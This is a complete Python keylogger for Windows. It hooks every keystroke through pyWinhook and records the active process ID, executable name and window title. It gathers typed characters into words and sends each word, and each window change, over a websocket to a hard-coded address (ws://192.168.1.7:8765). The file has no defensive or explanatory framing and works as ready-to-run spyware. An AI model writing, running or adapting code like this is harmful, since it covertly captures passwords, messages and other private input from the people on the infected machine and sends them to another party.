from ctypes import *
import pythoncom
import pyWinhook as pyhook
import pywintypes as pywin32
import websockets
import asyncio

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

url = "ws://192.168.1.7:8765"

logged = []

def get_current_process():
  
    hwnd = user32.GetForegroundWindow()


    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))


    process_id = "%d" % pid.value


    executable = create_string_buffer(b'\x00' * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    window_title = create_string_buffer(b'\x00' * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    print()

    keylogger_data = f"ID:{process_id} exe:{executable.value} title:{window_title.value}"



    print("[ PID: %s - %s - %s - %s ]" % (process_id,
                                     executable.value,
                                     window_title.value, 
                                     length
                                     )
          )
    print()


    print(keylogger_data)

    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

    return keylogger_data


def KeyStroke(event):
    global current_window

    if event.WindowName != current_window:
        current_window = event.WindowName
        data = get_current_process()

        asyncio.get_event_loop().run_until_complete(client(data))


    if 33 < event.Ascii < 127:
        logged.append(chr(event.Ascii))
        print(event.Ascii)
    if event.Ascii == 32 or event.Ascii == 13:
        concatinated = ""
        concatinated = concatinated.join(logged)
        logged.clear()
        asyncio.get_event_loop().run_until_complete(client(concatinated))
        concatinated = ""


    return True


async def client(data):
    async with websockets.connect(url) as websocket:
        await websocket.send(data)



kl = pyhook.HookManager()
kl.KeyDown = KeyStroke

kl.HookKeyboard()
pythoncom.PumpMessages()
